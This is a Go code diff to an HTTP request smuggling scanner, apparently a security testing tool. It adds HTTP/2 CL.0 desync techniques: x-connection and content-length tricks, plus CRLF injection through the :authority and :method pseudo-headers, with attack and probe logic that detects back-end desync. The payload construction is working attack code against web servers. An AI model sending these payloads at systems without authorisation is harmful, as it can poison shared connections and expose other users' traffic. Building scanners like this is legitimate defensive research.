@@ -105,6 +105,17 @@ func allCLMutations() []clMutation {
 		cl("CL-dual-zero-first"), // CL: 0\r\nCL: <n> — front takes first, back takes last
 		cl("CL-dual-zero-last"),  // CL: <n>\r\nCL: 0 — front takes last, back takes first
 
+		// ── Header injection / obs-fold techniques ────────────────────────────
+		// Source: Burp Suite HTTP Request Smuggler CL.0 scanner (observed payloads).
+		cl("CL-none"),             // No Content-Length at all — pure CL.0
+		cl("CL-connection-strip"), // Connection: Content-Length → proxy strips CL
+		cl("CL-badsetupCR"),       // Foo: bar\rContent-Length: <n> — bare CR injection
+		cl("CL-badsetupLF"),       // Foo: bar\nContent-Length: <n> — bare LF injection
+		cl("CL-0dwrap"),           // Foo: bar\r\n\rContent-Length: <n> — CR after obs-fold
+		cl("CL-nameprefix1"),      // Foo: bar\r\n Content-Length: <n> — obs-fold space
+		cl("CL-nameprefix2"),      // Foo: bar\r\n\tContent-Length: <n> — obs-fold tab
+		cl("CL-range"),            // Range: bytes=0-0 added after CL
+
 		// ── CLZero-derived static techniques ─────────────────────────────────
 		// Source: github.com/Moopinger/CLZero/blob/main/configs/default.py
 		cl("CL-alpha"),    // Content-Length: <n>aa ("normalize" in CLZero)
@@ -353,69 +364,51 @@ func ScanH2CL0(target *url.URL, base []byte, cfg config.Config, rep *report.Repo
 	baseStatus := baseline.Status
 	dbg(cfg, "H2CL0: baseline status=%d gadget=%q", baseStatus, gadget.payload)
 
-	// Header permutations — each isolates a specific forbidden/malformed trigger.
-	// Mirrors the exact headers observed in Burp Suite's CL.0 H2 scanner.
-	// Each technique is tested twice:
-	//   - no-cl variant: content-length suppressed (sentinel ""). The backend must
-	//     infer body absence from the malformed Expect/Connection headers alone.
-	//   - cl variant: content-length present (normal len(body)). Some front-ends
-	//     only trigger CL.0 when CL is explicit; others are blocked by it.
+	// Header permutations — each isolates a specific CL.0 trigger mechanism.
+	// Mirrors the exact techniques observed in Burp Suite's H2 CL.0 scanner.
+	//
+	// Key insight from Burp's payloads:
+	//   - Burp does NOT use Connection: keep-alive in H2 (forbidden per RFC 7540 §8.1.2.2).
+	//     Instead it uses X-Connection: keep-alive (a custom header, forwarded by some proxies).
+	//   - Burp does NOT use Expect: headers in H2 CL.0 scans.
+	//   - The actual CL.0 mechanism is content-length: 0 in the H2 HEADERS frame while the
+	//     DATA frame still carries the smuggled body prefix.
 	headerPerms := []struct {
 		name  string
 		extra map[string]string
 	}{
 		{
-			"connection+expect-obfs/no-cl",
+			// Primary Burp technique: X-Connection + CL=0.
+			// content-length: 0 tells the back-end the request has no body;
+			// the DATA frame bytes remain in the TCP buffer → CL.0.
+			"x-connection/cl-zero",
 			map[string]string{
-				"connection":     "keep-alive",
-				"expect":         "x 100-continue",
-				"content-length": "",
+				"x-connection":   "keep-alive",
+				"content-length": "0",
 			},
 		},
 		{
-			"connection+expect-obfs/cl",
+			// Burp variant: X-Connection + no CL header.
+			// No content-length at all; the back-end infers body absence → CL.0.
+			"x-connection/no-cl",
 			map[string]string{
-				"connection": "keep-alive",
-				"expect":     "x 100-continue",
+				"x-connection":   "keep-alive",
+				"content-length": "", // sentinel: suppress CL header
 			},
 		},
 		{
-			"connection-only/no-cl",
+			// Bare CL=0 without X-Connection.
+			// Some front-ends strip X-Connection; this covers those that just see CL=0.
+			"bare/cl-zero",
 			map[string]string{
-				"connection":     "keep-alive",
-				"content-length": "",
+				"content-length": "0",
 			},
 		},
 		{
-			"connection-only/cl",
+			// Bare no-CL: omit content-length entirely, no hop-by-hop tricks.
+			"bare/no-cl",
 			map[string]string{
-				"connection": "keep-alive",
-			},
-		},
-		{
-			"expect-obfs-only/no-cl",
-			map[string]string{
-				"expect":         "x 100-continue",
-				"content-length": "",
-			},
-		},
-		{
-			"expect-obfs-only/cl",
-			map[string]string{
-				"expect": "x 100-continue",
-			},
-		},
-		{
-			"expect-standard/no-cl",
-			map[string]string{
-				"expect":         "100-continue",
-				"content-length": "",
-			},
-		},
-		{
-			"expect-standard/cl",
-			map[string]string{
-				"expect": "100-continue",
+				"content-length": "", // suppress
 			},
 		},
 	}
@@ -429,99 +422,183 @@ func ScanH2CL0(target *url.URL, base []byte, cfg config.Config, rep *report.Repo
 				method, perm.name, gadget.payload, host)
 			dbg(cfg, "H2CL0 [%s/%s]: smuggled=%q", method, perm.name, smuggledBody)
 
-			for attempt := 0; attempt < cfg.Attempts; attempt++ {
-				// Single-connection probe: attack on stream 1, probe GET on stream 3.
-				// Both streams share the same H2→back-end TCP connection, so the probe
-				// lands on the same back-end worker that received the poisoned buffer.
-				_, probe, err := h2AttackAndProbe(
-					target, method, path, host, smuggledBody, perm.extra, cfg)
-				if err != nil {
-					dbg(cfg, "H2CL0 [%s/%s]: attempt %d error: %v",
-						method, perm.name, attempt, err)
-					continue
-				}
-				if probe.Status == 0 {
-					dbg(cfg, "H2CL0 [%s/%s]: attempt %d probe status=0, skipping",
-						method, perm.name, attempt)
-					continue
-				}
+			if cfg.ExitOnFind && h2cl0runPerm(target, method, path, host, smuggledBody, perm.extra, perm.name, gadget, baseStatus, cfg, rep) {
+				return
+			} else if !cfg.ExitOnFind {
+				h2cl0runPerm(target, method, path, host, smuggledBody, perm.extra, perm.name, gadget, baseStatus, cfg, rep)
+			}
+		}
 
-				probeStatus := probe.Status
-				// For headerOnly gadgets check decoded headers; otherwise check body.
-				var probeBytes []byte
-				if gadget.headerOnly {
-					for _, hf := range probe.Headers {
-						probeBytes = append(probeBytes, []byte(hf.Name+": "+hf.Value+"\r\n")...)
-					}
-				} else {
-					probeBytes = probe.Body
-				}
-				gadgetFound := request.ContainsStr(probeBytes, gadget.lookFor)
+		// ── H2 pseudo-header injection techniques ────────────────────────────
+		// Burp also probes CL injection via H2 :authority and :method pseudo-headers.
+		// When the front-end downgrades H2→H1, the crafted pseudo-header value may
+		// produce a non-numeric Content-Length in the H1 request, triggering CL.0
+		// on the back-end ("48x" is invalid → parsed as 0 by some implementations).
+		//
+		// The injected CL string uses "<n>x: x" where <n> is the real body length.
+		// The trailing "x: x" makes the injected text look like an additional header
+		// field to parsers that stop at the first non-numeric character of the CL value.
+		bodyLen := len(smuggledBody)
+		port := target.Port()
+		if port == "" {
+			port = "443"
+		}
 
-				dbg(cfg, "H2CL0 [%s/%s]: attempt %d probeStatus=%d baseline=%d gadget=%v",
-					method, perm.name, attempt, probeStatus, baseStatus, gadgetFound)
+		pseudoInjects := []struct {
+			name  string
+			extra map[string]string
+		}{
+			{
+				// :authority injection: the \r\n terminates the Host header value and
+				// injects a non-numeric Content-Length as a separate H1 header.
+				// When the H2→H1 front-end naively uses the :authority value as the
+				// Host header, the back-end sees:
+				//   Host: <host>:443\r\n
+				//   Content-Length: <n>x: x\r\n
+				// The non-numeric CL value triggers CL.0 on the back-end.
+				"authority-inject",
+				map[string]string{
+					":authority":     fmt.Sprintf("%s:%s\r\nContent-Length: %dx: x", target.Hostname(), port, bodyLen),
+					"x-connection":   "keep-alive",
+					"content-length": "", // suppress actual CL
+				},
+			},
+			{
+				// :method raw injection: method pseudo-header terminates the H1 request
+				// line with \r\n and injects a non-numeric Content-Length as a header.
+				// When the H2→H1 front-end naively uses the :method value as the request
+				// line, the back-end sees:
+				//   POST / HTTP/1.1\r\n
+				//   Content-Length: <n>x: x\r\n
+				// The non-numeric CL value triggers CL.0 on the back-end.
+				"method-inject-raw",
+				map[string]string{
+					":method":        fmt.Sprintf("POST / HTTP/1.1\r\nContent-Length: %dx: x", bodyLen),
+					"x-connection":   "keep-alive",
+					"content-length": "",
+				},
+			},
+			{
+				// :method URL-encoded injection: same as above but with percent-encoding.
+				// Some H2 implementations decode %20 before constructing the H1 request,
+				// making this equivalent to the raw variant on those targets.
+				// Others forward the encoded form verbatim, which the back-end may then
+				// decode — either way producing a non-numeric CL.
+				"method-inject-urlenc",
+				map[string]string{
+					":method":        fmt.Sprintf("POST%%20/%%20HTTP/1.1%%0D%%0AContent-Length:%%20%dx:%%20x", bodyLen),
+					"x-connection":   "keep-alive",
+					"content-length": "",
+				},
+			},
+		}
 
-				// ── Detection 1: gadget marker reflected (CONFIRMED) ─────
-				if gadgetFound {
-					dbg(cfg, "H2CL0 [%s/%s]: CONFIRMED gadget bleed at attempt %d",
-						method, perm.name, attempt)
-					rep.Emit(report.Finding{
-						Target:    target.String(),
-						Method:    "HTTP/2",
-						Severity:  report.SeverityConfirmed,
-						Type:      "H2.CL0",
-						Technique: fmt.Sprintf("H2.CL0/%s/%s", method, perm.name),
-						Description: fmt.Sprintf(
-							"H2 CL.0 desync confirmed (single-connection): forbidden/malformed "+
-								"headers (%s) caused the H2→H1 downgrade to leave the DATA body "+
-								"in the TCP buffer. Back-end parsed it as a new request; "+
-								"probe on stream 3 reflected gadget marker '%s' from '%s' "+
-								"(method=%s, attempt=%d).",
-							perm.name, gadget.lookFor, gadget.payload, method, attempt),
-						Evidence: fmt.Sprintf("attempt=%d gadget=%q marker=%q probe_status=%d baseline=%d",
-							attempt, gadget.payload, gadget.lookFor, probeStatus, baseStatus),
-						RawProbe: fmt.Sprintf(
-							"[stream 1] %s %s HTTP/2\r\nHost: %s\r\n%v\r\ncontent-length: %d\r\n\r\n%s\n"+
-								"[stream 3] GET %s HTTP/2\r\nHost: %s\r\n",
-							method, path, host, perm.extra, len(smuggledBody), smuggledBody, path, host),
-					})
-					if cfg.ExitOnFind {
-						return
-					}
-					break
-				}
+		for _, inj := range pseudoInjects {
+			if !techniqueEnabled("H2.CL0/"+inj.name, cfg) {
+				continue
+			}
+			rep.Log("H2CL0 pseudo-inject: method=%s perm=%s gadget=%s target=%s",
+				method, inj.name, gadget.payload, host)
+			dbg(cfg, "H2CL0 [%s/%s]: smuggled=%q bodyLen=%d", method, inj.name, smuggledBody, bodyLen)
 
-				// ── Detection 2: status divergence (PROBABLE) ────────────
-				if attempt > 0 && probeStatus != baseStatus && probeStatus != 429 {
-					dbg(cfg, "H2CL0 [%s/%s]: status divergence at attempt %d: base=%d probe=%d",
-						method, perm.name, attempt, baseStatus, probeStatus)
-					rep.Emit(report.Finding{
-						Target:    target.String(),
-						Method:    "HTTP/2",
-						Severity:  report.SeverityProbable,
-						Type:      "H2.CL0",
-						Technique: fmt.Sprintf("H2.CL0/%s/%s", method, perm.name),
-						Description: fmt.Sprintf(
-							"H2 CL.0 desync (single-connection): probe on stream 3 returned "+
-								"status %d vs baseline %d after %d attempts "+
-								"(headers=%s, method=%s). The smuggled prefix may have "+
-								"altered back-end routing on the shared connection.",
-							probeStatus, baseStatus, attempt, perm.name, method),
-						Evidence: fmt.Sprintf("attempt=%d probe_status=%d baseline=%d",
-							attempt, probeStatus, baseStatus),
-						RawProbe: fmt.Sprintf(
-							"[stream 1] %s %s HTTP/2\r\nHost: %s\r\n%v\r\ncontent-length: %d\r\n\r\n%s\n"+
-								"[stream 3] GET %s HTTP/2\r\nHost: %s\r\n",
-							method, path, host, perm.extra, len(smuggledBody), smuggledBody, path, host),
-					})
-					if cfg.ExitOnFind {
-						return
-					}
-					break
-				}
+			if cfg.ExitOnFind && h2cl0runPerm(target, method, path, host, smuggledBody, inj.extra, inj.name, gadget, baseStatus, cfg, rep) {
+				return
+			} else if !cfg.ExitOnFind {
+				h2cl0runPerm(target, method, path, host, smuggledBody, inj.extra, inj.name, gadget, baseStatus, cfg, rep)
 			}
 		}
 	}
+}
+
+// h2cl0runPerm executes a single H2 CL.0 permutation across cfg.Attempts attempts.
+// Returns true if a finding was emitted (used with ExitOnFind to short-circuit).
+func h2cl0runPerm(
+	target *url.URL, method, path, host, smuggledBody string,
+	extra map[string]string, permName string,
+	gadget *cl0Gadget, baseStatus int,
+	cfg config.Config, rep *report.Reporter,
+) bool {
+	for attempt := 0; attempt < cfg.Attempts; attempt++ {
+		// Single-connection probe: attack on stream 1, probe GET on stream 3.
+		// Both streams share the same H2→back-end TCP connection.
+		_, probe, err := h2AttackAndProbe(target, method, path, host, smuggledBody, extra, cfg)
+		if err != nil {
+			dbg(cfg, "H2CL0 [%s/%s]: attempt %d error: %v", method, permName, attempt, err)
+			continue
+		}
+		if probe.Status == 0 {
+			dbg(cfg, "H2CL0 [%s/%s]: attempt %d probe status=0, skipping", method, permName, attempt)
+			continue
+		}
+
+		probeStatus := probe.Status
+
+		// Collect probe bytes for gadget matching.
+		var probeBytes []byte
+		if gadget.headerOnly {
+			for _, hf := range probe.Headers {
+				probeBytes = append(probeBytes, []byte(hf.Name+": "+hf.Value+"\r\n")...)
+			}
+		} else {
+			probeBytes = probe.Body
+		}
+		gadgetFound := request.ContainsStr(probeBytes, gadget.lookFor)
+
+		dbg(cfg, "H2CL0 [%s/%s]: attempt %d probeStatus=%d baseline=%d gadget=%v",
+			method, permName, attempt, probeStatus, baseStatus, gadgetFound)
+
+		// ── Detection 1: gadget marker reflected (CONFIRMED) ─────────────
+		if gadgetFound {
+			dbg(cfg, "H2CL0 [%s/%s]: CONFIRMED gadget bleed at attempt %d", method, permName, attempt)
+			rep.Emit(report.Finding{
+				Target:    target.String(),
+				Method:    "HTTP/2",
+				Severity:  report.SeverityConfirmed,
+				Type:      "H2.CL0",
+				Technique: fmt.Sprintf("H2.CL0/%s/%s", method, permName),
+				Description: fmt.Sprintf(
+					"H2 CL.0 desync confirmed (single-connection): technique '%s' caused "+
+						"the H2→H1 downgrade to leave the DATA body in the TCP buffer. "+
+						"Back-end parsed it as a new request; probe on stream 3 reflected "+
+						"gadget marker '%s' from '%s' (method=%s, attempt=%d).",
+					permName, gadget.lookFor, gadget.payload, method, attempt),
+				Evidence: fmt.Sprintf("attempt=%d gadget=%q marker=%q probe_status=%d baseline=%d",
+					attempt, gadget.payload, gadget.lookFor, probeStatus, baseStatus),
+				RawProbe: fmt.Sprintf(
+					"[stream 1] %s %s HTTP/2\r\nHost: %s\r\n%v\r\ncontent-length: %d\r\n\r\n%s\n"+
+						"[stream 3] GET %s HTTP/2\r\nHost: %s\r\n",
+					method, path, host, extra, len(smuggledBody), smuggledBody, path, host),
+			})
+			return true
+		}
+
+		// ── Detection 2: status divergence (PROBABLE) ────────────────────
+		if attempt > 0 && probeStatus != baseStatus && probeStatus != 429 {
+			dbg(cfg, "H2CL0 [%s/%s]: status divergence at attempt %d: base=%d probe=%d",
+				method, permName, attempt, baseStatus, probeStatus)
+			rep.Emit(report.Finding{
+				Target:    target.String(),
+				Method:    "HTTP/2",
+				Severity:  report.SeverityProbable,
+				Type:      "H2.CL0",
+				Technique: fmt.Sprintf("H2.CL0/%s/%s", method, permName),
+				Description: fmt.Sprintf(
+					"H2 CL.0 desync (single-connection): probe on stream 3 returned "+
+						"status %d vs baseline %d after %d attempts "+
+						"(technique=%s, method=%s). The smuggled prefix may have "+
+						"altered back-end routing on the shared connection.",
+					probeStatus, baseStatus, attempt, permName, method),
+				Evidence: fmt.Sprintf("attempt=%d probe_status=%d baseline=%d",
+					attempt, probeStatus, baseStatus),
+				RawProbe: fmt.Sprintf(
+					"[stream 1] %s %s HTTP/2\r\nHost: %s\r\n%v\r\ncontent-length: %d\r\n\r\n%s\n"+
+						"[stream 3] GET %s HTTP/2\r\nHost: %s\r\n",
+					method, path, host, extra, len(smuggledBody), smuggledBody, path, host),
+			})
+			return true
+		}
+	}
+	return false
 }
 
 // selectCL0Gadget fires each gadget request directly to find one whose
